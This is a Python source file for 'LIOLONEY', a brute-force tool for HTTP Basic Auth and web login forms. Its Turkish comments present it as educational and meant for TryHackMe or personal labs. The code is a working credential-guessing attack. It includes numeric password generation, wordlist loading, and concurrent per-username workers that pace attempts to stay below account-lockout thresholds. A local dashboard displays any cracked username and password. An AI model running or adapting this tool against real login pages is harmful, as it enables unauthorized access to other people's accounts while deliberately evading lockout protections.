#!/usr/bin/env python3
"""
lioloney.py
-------------------
LIOLONEY - TryHackMe / lab ortamları için eğitim amaçlı, asenkron HTTP/HTTPS
brute-force aracı. 4 mod destekler (Hydra modüllerine benzer isimlendirme):

  http-get    -> HTTP Basic Authentication, GET isteğiyle
  http-post   -> HTTP Basic Authentication, POST isteğiyle
  form-get    -> Web formu, GET ile (parametreler URL'de)
  form-post   -> Web formu, POST ile (parametreler body'de)

KİLİTLEME (LOCKOUT) FARKINDALIĞI:
Hedef "N yanlış denemeden sonra X saniye bekletiyor" davranışı gösteriyorsa,
bu araç HER KULLANICI ADI için ayrı bir "worker" (görev) çalıştırır ve kendi
kotasına ulaşınca otomatik olarak bekler. Böylece bir kullanıcı adı beklerken
diğerleri denemeye devam eder -> toplam verim kullanıcı sayısıyla çarpılır.
Tek bir hesaba karşı gerçek kilitleme varsa (ör. 5 deneme / 30 sn), matematiksel
olarak etkin hız ~0.14 istek/sn'dir ve 7+ haneli sayısal şifrelerde brute-force
PRATİKTE İMKANSIZ hale gelir. Bu aracın amacı bu gerçeği gizlemek değil, mevcut
koşullarda ULAŞILABİLİR en iyi hızı sağlamaktır.

KEYSPACE SINIRI: Bu sürüm en fazla 10 haneli sayısal şifre üretimini destekler
(10 hane = 10 milyar kombinasyon, kilitleme olmadan bile günler sürer).

SADECE izin verilen (TryHackMe, kendi lab'iniz, vb.) hedeflerde kullanın.

Kurulum:
    pip install aiohttp flask

Çalıştırma:
    python3 lioloney.py -u ... [parametreler]

Varsayılan wordlist ile (araçla birlikte gelen wordlists/priority_passwords.txt,
~116.000 gerçekçi aday: yaygın şifreler + tarih bazlı PIN'ler + tekrarlı/sıralı rakamlar):
    python3 fast_bruteforce.py -u http://10.10.10.10/login --mode form-post \
        -d "username=FUSER&password=FPASS" -U usernames.txt \
        -f "Invalid credentials" --lockout-threshold 5 --lockout-wait 30

Kendi şifre listenle:
    ... -P my_passwords.txt ...

Uzunluk aralığı üreterek (max 10):
    ... --min-len 6 --max-len 8 ...

wordlists/ klasöründeki TÜM listeleri birleştirerek (ileride başkaları da
kendi listelerini bu klasöre ekleyebilir):
    ... --wordlist-dir ./wordlists ...
"""

import argparse
import asyncio
import base64
import itertools
import os
import sys
import time
import threading
from collections import Counter
from urllib.parse import urlparse

import aiohttp

try:
    from flask import Flask, jsonify, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

MAX_NUMERIC_LEN = 10
DEFAULT_WORDLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlists", "priority_passwords.txt")


# --------------------------------------------------------------------------
# Argümanlar
# --------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(prog="lioloney", description="LIOLONEY - Hızlı, kilitlenme-farkında async HTTP/HTTPS brute-force aracı (eğitim amaçlı)")
    p.add_argument("-u", "--url", required=True, help="Hedef URL (http:// veya https://)")
    p.add_argument("--mode", choices=["http-get", "http-post", "form-get", "form-post"], default="form-post",
                   help="http-get/http-post = HTTP Basic Auth | form-get/form-post = web formu")
    p.add_argument("-d", "--data", default="", help="form-post için body şablonu (FUSER/FPASS placeholder)")
    p.add_argument("-U", "--userlist", required=True, help="Kullanıcı adı listesi dosyası")

    pw_group = p.add_mutually_exclusive_group()
    pw_group.add_argument("-P", "--passlist", help="Hazır şifre listesi dosyası (verilmezse varsayılan wordlist kullanılır)")
    pw_group.add_argument("--wordlist-dir", help="Bu klasördeki TÜM .txt dosyalarını birleştirip kullan (katkıcılar yeni liste ekleyebilir)")
    pw_group.add_argument("--min-len", type=int, help=f"Üretilecek sayısal şifrelerin min uzunluğu (1-{MAX_NUMERIC_LEN})")

    p.add_argument("--max-len", type=int, help="--min-len ile birlikte kullanılır")
    p.add_argument("-f", "--fail-text", help="form modlarında başarısız girişte görünen metin (zorunlu)")
    p.add_argument("--success-status", type=int, default=200, help="http-get/http-post modunda başarı HTTP kodu")
    p.add_argument("--lockout-text", default="", help="Gerçek kilitlenme mesajı tespit edilirse ekstra bekleme (opsiyonel)")
    p.add_argument("--lockout-threshold", type=int, default=5, help="Kaç denemeden sonra proaktif olarak beklenecek")
    p.add_argument("--lockout-wait", type=float, default=30.0, help="Her eşik sonrası bekleme süresi (saniye)")
    p.add_argument("-c", "--concurrency", type=int, default=100, help="Global eşzamanlı istek üst sınırı")
    p.add_argument("-t", "--timeout", type=float, default=10.0)
    p.add_argument("--headers", default="")
    p.add_argument("--dashboard", action="store_true")
    p.add_argument("--dashboard-port", type=int, default=5000)
    p.add_argument("--yes", action="store_true", help="Büyük keyspace uyarısını onaylamadan geç")
    return p.parse_args()


def load_lines(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def load_wordlist_dir(path):
    combined = set()
    for fname in sorted(os.listdir(path)):
        if fname.endswith(".txt"):
            combined.update(load_lines(os.path.join(path, fname)))
    return sorted(combined)


def parse_headers(raw):
    headers = {}
    if not raw:
        return headers
    for pair in raw.split(";"):
        if ":" in pair:
            k, v = pair.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def validate_scheme(url):
    scheme = urlparse(url).scheme.lower()
    if scheme not in ("http", "https"):
        print(f"[!] Desteklenmeyen şema: '{scheme}'. Sadece http:// ve https:// desteklenir.")
        sys.exit(1)


def gen_numeric_passwords(min_len, max_len):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product("0123456789", repeat=length):
            yield "".join(combo)


def keyspace_size(min_len, max_len):
    return sum(10 ** l for l in range(min_len, max_len + 1))


def confirm_large_keyspace(total, skip_confirm, lockout_threshold, lockout_wait):
    effective_rate = lockout_threshold / (lockout_wait + 1)  # kaba tahmin
    eta_hours = total / effective_rate / 3600
    print(f"[*] Keyspace: {total:,} kombinasyon")
    print(f"[*] Kilitleme ile tahmini etkin hız: ~{effective_rate:.2f} istek/sn (kullanıcı başına)")
    print(f"[*] Tek kullanıcıya karşı tahmini süre: ~{eta_hours:,.0f} saat")
    if total > 1_000_000 and not skip_confirm:
        answer = input("Bu süre çok uzun olabilir, devam etmek istiyor musunuz? (evet/hayır): ").strip().lower()
        if answer not in ("evet", "e", "yes", "y"):
            print("İptal edildi.")
            sys.exit(0)


# --------------------------------------------------------------------------
# Paylaşılan istatistikler (asyncio tek thread -> lock gerekmez)
# --------------------------------------------------------------------------

stats = {
    "tried": 0,
    "errors": 0,
    "lockouts_hit": 0,
    "status_codes": Counter(),
    "start": None,
    "found": None,
    "total": 0,          # bilinen toplam deneme alanı (yaklaşık, ilerleme çubuğu için)
    "history": [],        # [(saniye, tried_o_andaki_deger), ...] -> grafik için
}


def record_history_sample():
    """Her ~2 saniyede bir çağrılır, grafikte gösterilecek zaman serisini biriktirir."""
    elapsed = time.time() - stats["start"] if stats["start"] else 0
    stats["history"].append({"t": round(elapsed, 1), "tried": stats["tried"]})
    if len(stats["history"]) > 180:  # en fazla ~6 dakikalık örnek tut
        stats["history"].pop(0)


# --------------------------------------------------------------------------
# Dashboard (sadece 127.0.0.1 - dışarıdan erişilemez)
# --------------------------------------------------------------------------

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<title>LIOLONEY Dashboard</title>
<link rel="icon" href="data:,">
<style>
  :root{
    --bg:#0b0d13; --panel:#151822; --panel2:#1b1f2c; --border:#262b3a;
    --text:#e8e9ed; --muted:#8c93a6; --accent:#7c9eff; --good:#35d08a;
    --warn:#f5a623; --bad:#ff5d6c;
  }
  *{box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);
       color:var(--text);margin:0;padding:2rem;max-width:1100px;margin-inline:auto}
  header{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.75rem;margin-bottom:1.5rem}
  .brand{display:flex;align-items:center;gap:.6rem;font-size:1.3rem;font-weight:700;letter-spacing:.5px}
  .brand .dot{width:10px;height:10px;border-radius:50%;background:var(--good);box-shadow:0 0 10px var(--good)}
  .brand .dot.done{background:var(--accent);box-shadow:0 0 10px var(--accent)}
  .badge{font-size:.75rem;padding:.3rem .7rem;border-radius:99px;background:var(--panel2);color:var(--muted);border:1px solid var(--border)}

  .found-banner{display:none;background:linear-gradient(90deg,#113a2b,#0b0d13);border:1px solid var(--good);
       border-radius:12px;padding:1rem 1.2rem;margin-bottom:1.3rem;font-size:1.05rem}
  .found-banner b{color:var(--good)}

  .progress-wrap{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:1rem 1.2rem;margin-bottom:1.3rem}
  .progress-top{display:flex;justify-content:space-between;font-size:.8rem;color:var(--muted);margin-bottom:.5rem}
  .progress-bar{height:10px;border-radius:99px;background:var(--panel2);overflow:hidden}
  .progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--good));width:0%;transition:width .4s}

  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin-bottom:1.5rem}
  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:1rem 1.2rem}
  .label{font-size:.72rem;opacity:.65;text-transform:uppercase;letter-spacing:.5px}
  .value{font-size:1.7rem;font-weight:700;margin-top:.35rem}
  .value.good{color:var(--good)} .value.bad{color:var(--bad)} .value.warn{color:var(--warn)}

  .panels{display:grid;grid-template-columns:1.3fr 1fr;gap:1.3rem}
  @media (max-width:800px){.panels{grid-template-columns:1fr}}
  .panel{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:1.1rem 1.2rem}
  .panel h3{margin:0 0 .8rem 0;font-size:.95rem;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
  canvas{max-height:220px}

  table{width:100%;border-collapse:collapse;font-size:.88rem}
  td,th{padding:.45rem .3rem;text-align:left}
  thead th{color:var(--muted);font-weight:600;font-size:.75rem;text-transform:uppercase;border-bottom:1px solid var(--border)}
  tbody tr:not(:last-child) td{border-bottom:1px solid var(--border)}
  .status-pill{display:inline-block;min-width:2.4rem;text-align:center;padding:.15rem .5rem;border-radius:6px;font-weight:700;font-size:.8rem}
  .status-2xx{background:#113a2b;color:var(--good)}
  .status-4xx{background:#3a2a11;color:var(--warn)}
  .status-5xx{background:#3a1116;color:var(--bad)}
  .status-other{background:var(--panel2);color:var(--muted)}
  .bar-track{background:var(--panel2);border-radius:99px;height:6px;width:100%;margin-top:.3rem;overflow:hidden}
  .bar-fill{height:100%;background:var(--accent)}
</style>
</head>
<body>

<header>
  <div class="brand"><span class="dot" id="statusDot"></span> LIOLONEY <span style="color:var(--muted);font-weight:400">dashboard</span></div>
  <span class="badge">sadece bu makineden erişilebilir • 127.0.0.1</span>
</header>

<div class="found-banner" id="foundBanner"></div>

<div class="progress-wrap">
  <div class="progress-top">
    <span id="progressLabel">İlerleme</span>
    <span id="progressPct">0%</span>
  </div>
  <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
</div>

<div class="grid" id="grid"></div>

<div class="panels">
  <div class="panel">
    <h3>Hız (istek / saniye)</h3>
    <canvas id="rateChart"></canvas>
  </div>
  <div class="panel">
    <h3>HTTP Durum Kodu Dağılımı</h3>
    <table><thead><tr><th>Kod</th><th>Sayı</th><th>Oran</th></tr></thead><tbody id="statusTable"></tbody></table>
  </div>
</div>

<script>
// Harici hiçbir kütüphane kullanmadan (internetsiz ortamlarda da çalışsın diye),
// elle çizilen basit bir çizgi grafik (sparkline).
function statusClass(code){
  code = String(code);
  if (code.startsWith('2')) return 'status-2xx';
  if (code.startsWith('4')) return 'status-4xx';
  if (code.startsWith('5')) return 'status-5xx';
  return 'status-other';
}

function drawRateChart(history){
  const canvas = document.getElementById('rateChart');
  const dpr = window.devicePixelRatio || 1;
  const cssWidth = canvas.clientWidth || 400;
  const cssHeight = 220;
  canvas.width = cssWidth * dpr;
  canvas.height = cssHeight * dpr;
  canvas.style.height = cssHeight + 'px';
  const ctx = canvas.getContext('2d');
  ctx.scale(dpr, dpr);
  ctx.clearRect(0, 0, cssWidth, cssHeight);

  if (!history || history.length < 2){
    ctx.fillStyle = '#8c93a6';
    ctx.font = '13px sans-serif';
    ctx.fillText('Veri bekleniyor...', 10, cssHeight / 2);
    return;
  }

  const rates = [];
  for (let i = 0; i < history.length; i++){
    if (i === 0){ rates.push(0); continue; }
    const dt = history[i].t - history[i - 1].t;
    const dn = history[i].tried - history[i - 1].tried;
    rates.push(dt > 0 ? dn / dt : 0);
  }

  const padding = { top: 12, right: 12, bottom: 22, left: 36 };
  const plotW = cssWidth - padding.left - padding.right;
  const plotH = cssHeight - padding.top - padding.bottom;
  const maxRate = Math.max(1, ...rates);

  // Izgara çizgileri
  ctx.strokeStyle = '#262b3a';
  ctx.lineWidth = 1;
  for (let i = 0; i <= 4; i++){
    const y = padding.top + (plotH / 4) * i;
    ctx.beginPath();
    ctx.moveTo(padding.left, y);
    ctx.lineTo(cssWidth - padding.right, y);
    ctx.stroke();
    const val = (maxRate * (1 - i / 4)).toFixed(1);
    ctx.fillStyle = '#8c93a6';
    ctx.font = '11px sans-serif';
    ctx.fillText(val, 2, y + 4);
  }

  // Dolgu alanı + çizgi
  const stepX = plotW / (rates.length - 1);
  ctx.beginPath();
  rates.forEach((r, i) => {
    const x = padding.left + i * stepX;
    const y = padding.top + plotH - (r / maxRate) * plotH;
    if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
  });
  ctx.strokeStyle = '#7c9eff';
  ctx.lineWidth = 2;
  ctx.stroke();

  ctx.lineTo(padding.left + (rates.length - 1) * stepX, padding.top + plotH);
  ctx.lineTo(padding.left, padding.top + plotH);
  ctx.closePath();
  ctx.fillStyle = 'rgba(124,158,255,0.15)';
  ctx.fill();
}

async function tick(){
  let d;
  try {
    const resp = await fetch('/api/stats');
    d = await resp.json();
  } catch (e) {
    document.getElementById('grid').innerHTML =
      `<div class="card"><div class="label">Hata</div><div class="value warn">API bağlantısı kurulamadı</div></div>`;
    console.error('Dashboard API hatası:', e);
    return;
  }

  document.getElementById('statusDot').className = 'dot' + (d.found ? ' done' : '');

  if (d.found){
    const b = document.getElementById('foundBanner');
    b.style.display = 'block';
    b.innerHTML = `✅ <b>BULUNDU</b> — Kullanıcı: <b>${d.found.username}</b> &nbsp;|&nbsp; Şifre: <b>${d.found.password}</b> &nbsp;|&nbsp; HTTP ${d.found.status}`;
  }

  const pct = d.total > 0 ? Math.min(100, (d.tried / d.total) * 100) : 0;
  document.getElementById('progressFill').style.width = pct.toFixed(1) + '%';
  document.getElementById('progressPct').textContent = d.total > 0 ? pct.toFixed(1) + '%' : '—';
  document.getElementById('progressLabel').textContent = `${d.tried.toLocaleString()} / ${d.total ? d.total.toLocaleString() : '?'} deneme`;

  document.getElementById('grid').innerHTML = `
    <div class="card"><div class="label">Denenen</div><div class="value">${d.tried.toLocaleString()}</div></div>
    <div class="card"><div class="label">Hız (istek/sn)</div><div class="value good">${d.rate.toFixed(2)}</div></div>
    <div class="card"><div class="label">Geçen süre</div><div class="value">${d.elapsed.toFixed(0)}s</div></div>
    <div class="card"><div class="label">Hata</div><div class="value ${d.errors>0?'warn':''}">${d.errors}</div></div>
    <div class="card"><div class="label">Kilitlenme</div><div class="value ${d.lockouts_hit>0?'warn':''}">${d.lockouts_hit}</div></div>
    <div class="card"><div class="label">Durum</div><div class="value ${d.found?'good':''}">${d.found?'BULUNDU':'Çalışıyor'}</div></div>
  `;

  const totalStatus = Object.values(d.status_codes).reduce((a,b)=>a+b,0) || 1;
  document.getElementById('statusTable').innerHTML = Object.entries(d.status_codes)
    .sort((a,b)=>b[1]-a[1])
    .map(([k,v]) => {
      const pct = ((v/totalStatus)*100).toFixed(1);
      return `<tr>
        <td><span class="status-pill ${statusClass(k)}">${k}</span></td>
        <td>${v.toLocaleString()}</td>
        <td style="width:40%">${pct}%
          <div class="bar-track"><div class="bar-fill" style="width:${pct}%"></div></div>
        </td>
      </tr>`;
    }).join('');

  try {
    drawRateChart(d.history);
  } catch (e) {
    console.error('Grafik çizilirken hata:', e);
  }
}

setInterval(tick, 1000);
tick();
window.addEventListener('resize', () => tick());
</script>
</body>
</html>
"""


def start_dashboard(port):
    if not FLASK_AVAILABLE:
        print("[!] flask kurulu değil (pip install flask). Dashboard atlanıyor.")
        return
    app = Flask(__name__)

    @app.route("/")
    def index():
        return render_template_string(DASHBOARD_HTML)

    @app.route("/api/stats")
    def api_stats():
        elapsed = time.time() - stats["start"] if stats["start"] else 0
        rate = stats["tried"] / elapsed if elapsed > 0 else 0
        return jsonify({
            "tried": stats["tried"], "errors": stats["errors"], "total": stats["total"],
            "lockouts_hit": stats["lockouts_hit"], "elapsed": elapsed, "rate": rate,
            "status_codes": dict(stats["status_codes"]), "found": stats["found"],
            "history": stats["history"],
        })

    threading.Thread(target=lambda: app.run(host="127.0.0.1", port=port, debug=False, use_reloader=False), daemon=True).start()
    print(f"[*] Dashboard: http://127.0.0.1:{port} (sadece bu makineden erişilebilir, görsel grafikler + tablolar ile)")


# --------------------------------------------------------------------------
# Tek bir deneme gönderme (moda göre)
# --------------------------------------------------------------------------

async def send_attempt(session, args, username, password):
    """Döner: (basarili_mi, lockout_tetiklendi_mi, status_code)"""
    try:
        if args.mode == "http-get":
            auth = aiohttp.BasicAuth(username, password)
            async with session.get(args.url, auth=auth, timeout=args.timeout) as resp:
                body = await resp.text()
                ok = resp.status == args.success_status
                lockout = bool(args.lockout_text) and args.lockout_text in body
                return ok, lockout, resp.status

        elif args.mode == "http-post":
            auth = aiohttp.BasicAuth(username, password)
            async with session.post(args.url, auth=auth, timeout=args.timeout) as resp:
                body = await resp.text()
                ok = resp.status == args.success_status
                lockout = bool(args.lockout_text) and args.lockout_text in body
                return ok, lockout, resp.status

        elif args.mode == "form-get":
            url = args.url.replace("FUSER", username).replace("FPASS", password)
            async with session.get(url, timeout=args.timeout) as resp:
                body = await resp.text()
                lockout = bool(args.lockout_text) and args.lockout_text in body
                ok = (args.fail_text not in body) and not lockout
                return ok, lockout, resp.status

        else:  # form-post
            body_data = args.data.replace("FUSER", username).replace("FPASS", password)
            async with session.post(args.url, data=body_data, timeout=args.timeout) as resp:
                body = await resp.text()
                lockout = bool(args.lockout_text) and args.lockout_text in body
                ok = (args.fail_text not in body) and not lockout
                return ok, lockout, resp.status

    except Exception:
        stats["errors"] += 1
        return False, False, None


# --------------------------------------------------------------------------
# Her kullanıcı adı için bağımsız, kendi kendini throttle eden worker
# --------------------------------------------------------------------------

async def username_worker(session, args, username, password_source_factory, sem, stop_event):
    attempts_since_pause = 0
    for password in password_source_factory():
        if stop_event.is_set():
            return
        async with sem:
            if stop_event.is_set():
                return
            ok, lockout_detected, status = await send_attempt(session, args, username, password)

        if status is not None:
            stats["status_codes"][status] += 1
        stats["tried"] += 1

        if ok:
            stop_event.set()
            stats["found"] = {"username": username, "password": password, "status": status}
            return

        if lockout_detected:
            # Gerçek kilitlenme mesajı görüldü -> aynı şifreyi tekrar dene, uzunca bekle
            stats["lockouts_hit"] += 1
            await asyncio.sleep(args.lockout_wait)
            attempts_since_pause = 0
            continue

        attempts_since_pause += 1
        if attempts_since_pause >= args.lockout_threshold:
            # Proaktif bekleme: kilitlenmeyi TETİKLEMEDEN önce dur
            await asyncio.sleep(args.lockout_wait)
            attempts_since_pause = 0


BANNER = r"""
  _     _       _                         
 | |   (_) ___ | | ___  _ __   ___ _   _  
 | |   | |/ _ \| |/ _ \| '_ \ / _ \ | | | 
 | |___| | (_) | | (_) | | | |  __/ |_| | 
 |_____|_|\___/|_|\___/|_| |_|\___|\__, | 
                                    |___/   v1.0
"""


async def main():
    print(BANNER)
    args = parse_args()
    validate_scheme(args.url)
    if args.mode in ("form-get", "form-post") and not args.fail_text:
        print("[!] form-get/form-post modunda -f/--fail-text zorunludur.")
        sys.exit(1)

    usernames = load_lines(args.userlist)

    # Şifre kaynağı önceliği: -P > --wordlist-dir > --min-len/--max-len > varsayılan wordlist
    if args.passlist:
        pw_list = load_lines(args.passlist)
        total_per_user = len(pw_list)
        password_source_factory = lambda: iter(pw_list)
    elif args.wordlist_dir:
        pw_list = load_wordlist_dir(args.wordlist_dir)
        total_per_user = len(pw_list)
        password_source_factory = lambda: iter(pw_list)
    elif args.min_len:
        if not args.max_len:
            print("[!] --min-len ile --max-len birlikte verilmeli.")
            sys.exit(1)
        if not (1 <= args.min_len <= args.max_len <= MAX_NUMERIC_LEN):
            print(f"[!] Uzunluk aralığı 1-{MAX_NUMERIC_LEN} arasında olmalı.")
            sys.exit(1)
        total_per_user = keyspace_size(args.min_len, args.max_len)
        password_source_factory = lambda: gen_numeric_passwords(args.min_len, args.max_len)
    else:
        if not os.path.exists(DEFAULT_WORDLIST):
            print("[!] Varsayılan wordlist bulunamadı, -P veya --min-len/--max-len verin.")
            sys.exit(1)
        pw_list = load_lines(DEFAULT_WORDLIST)
        total_per_user = len(pw_list)
        password_source_factory = lambda: iter(pw_list)
        print(f"[*] Varsayılan wordlist kullanılıyor: {DEFAULT_WORDLIST} ({total_per_user} şifre)")

    confirm_large_keyspace(total_per_user, args.yes, args.lockout_threshold, args.lockout_wait)

    headers = parse_headers(args.headers)
    print(f"[*] Mod: {args.mode} | Kullanıcı sayısı: {len(usernames)} | Kullanıcı başına şifre: {total_per_user:,}")
    print(f"[*] Kilitleme ayarı: {args.lockout_threshold} deneme / {args.lockout_wait}s bekleme")

    if args.dashboard:
        start_dashboard(args.dashboard_port)

    sem = asyncio.Semaphore(args.concurrency)
    stop_event = asyncio.Event()
    stats["start"] = time.time()
    stats["total"] = total_per_user * len(usernames)

    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        tasks = [
            asyncio.create_task(username_worker(session, args, u, password_source_factory, sem, stop_event))
            for u in usernames
        ]

        async def progress_printer():
            tick = 0
            while not stop_event.is_set():
                elapsed = time.time() - stats["start"]
                rate = stats["tried"] / elapsed if elapsed > 0 else 0
                print(f"\r[*] Denenen: {stats['tried']:,}  Hız: {rate:.2f} istek/sn  Kilitlenme: {stats['lockouts_hit']}", end="", flush=True)
                if args.dashboard and tick % 2 == 0:  # ~2 saniyede bir grafiğe örnek ekle
                    record_history_sample()
                tick += 1
                await asyncio.sleep(1)

        printer_task = asyncio.create_task(progress_printer())
        await asyncio.gather(*tasks)
        stop_event.set()
        printer_task.cancel()

    elapsed = time.time() - stats["start"]
    rate = stats["tried"] / elapsed if elapsed > 0 else 0
    print("\n\n========== ÖZET ==========")
    print(f"Toplam deneme     : {stats['tried']:,}")
    print(f"Süre              : {elapsed:.2f} sn")
    print(f"Ortalama hız      : {rate:.2f} istek/sn")
    print(f"Hata sayısı       : {stats['errors']}")
    print(f"Kilitlenme sayısı : {stats['lockouts_hit']}")
    print(f"Status kodları    : {dict(stats['status_codes'])}")
    if stats["found"]:
        f = stats["found"]
        print(f"[+] BULUNDU -> Kullanıcı: {f['username']}  Şifre: {f['password']}  (HTTP {f['status']})")
    else:
        print("[-] Kombinasyon bulunamadı.")

    if args.dashboard:
        print(f"\nDetaylı panel hâlâ açık: http://127.0.0.1:{args.dashboard_port} (Ctrl+C ile kapat)")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    print("===========================")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Kullanıcı tarafından durduruldu.")
        sys.exit(1)
